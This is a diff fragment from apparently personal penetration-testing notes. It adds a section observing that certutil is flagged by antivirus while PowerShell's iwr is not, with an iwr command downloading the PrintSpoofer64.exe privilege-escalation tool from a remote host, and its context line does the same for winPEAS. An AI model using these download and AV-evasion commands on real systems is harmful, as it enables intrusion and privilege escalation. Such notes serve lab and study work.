@@ -1598,7 +1598,19 @@ iwr -uri http://x.x.x.x/winpeas.exe -Outfile winpeas.exe
     </script>
 ```
 
-- 
+---------------
+
+### Weirdstuff
+
+---------------
+
+- `Certutil` gets filtered by AV while `iwr` doesn't get bypassed.
+
+```powershell
+iwr http://10.8.36.31:8002/PrintSpoofer64.exe -Outfile C:\Users\Bob\Desktop\PrintSpoofer64.exe
+```
+
+---------------
 
 
 
